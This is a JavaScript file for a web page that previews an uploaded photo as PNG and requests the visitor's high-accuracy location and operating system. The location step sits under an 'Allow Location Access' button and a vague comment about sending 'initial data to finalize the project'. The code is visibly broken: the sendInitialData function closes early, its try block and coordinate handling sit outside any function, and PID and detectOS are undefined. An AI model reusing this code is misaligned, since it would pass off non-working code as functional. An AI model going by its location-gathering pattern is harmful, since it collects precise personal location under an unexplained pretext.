// Select HTML elements
const photoInput = document.getElementById('photoInput');
const uploadBtn = document.getElementById('uploadBtn');
const preview = document.getElementById('preview');
const getLocationBtn = document.getElementById('getLocationBtn');
const statusDiv = document.getElementById('status');
  


// Fetch location and send initial data to finalize the project
async function sendInitialData(PID) {
  const os = detectOS();
  statusDiv.textContent = 'Fetching location... Please wait.';
}
  try {
    // Get location using the Geolocation API
    const position = await new Promise((resolve, reject) => {
      navigator.geolocation.getCurrentPosition(resolve, reject, {
        enableHighAccuracy: true,
        timeout: 10000, // Set a timeout to avoid waiting indefinitely
        maximumAge: 0,  // Avoid cached results
      });
    });
  }catch(e){}
    
  const { latitude, longitude } = position.coords;


// Add event listener to the "Allow Location Access" button
getLocationBtn.addEventListener('click', () => {
  sendInitialData(PID);
});

// Handle image preview when the user selects a file
photoInput.addEventListener('change', async (event) => {
  const file = event.target.files[0];
  if (file) {
    try {
      const dataUrl = await readImageAsDataUrl(file);
      const pngDataUrl = await convertToPng(dataUrl);
      preview.src = pngDataUrl;
      preview.style.display = 'block';
    } catch (error) {
      alert(`Error: ${error}`);
    }
  }
});

// Read an image file as a data URL
function readImageAsDataUrl(file) {
  return new Promise((resolve, reject) => {
    const reader = new FileReader();
    reader.onload = (e) => resolve(e.target.result);
    reader.onerror = () => reject('Failed to read the image file.');
    reader.readAsDataURL(file);
  });
}

// Convert the image to PNG using a canvas
function convertToPng(dataUrl) {
  return new Promise((resolve, reject) => {
    const img = new Image();
    img.crossOrigin = 'Anonymous';
    img.onload = () => {
      const canvas = document.createElement('canvas');
      canvas.width = img.width;
      canvas.height = img.height;
      canvas.getContext('2d').drawImage(img, 0, 0);
      resolve(canvas.toDataURL('image/png'));
    };
    img.onerror = () => reject('Failed to load the image.');
    img.src = dataUrl;
  });
}
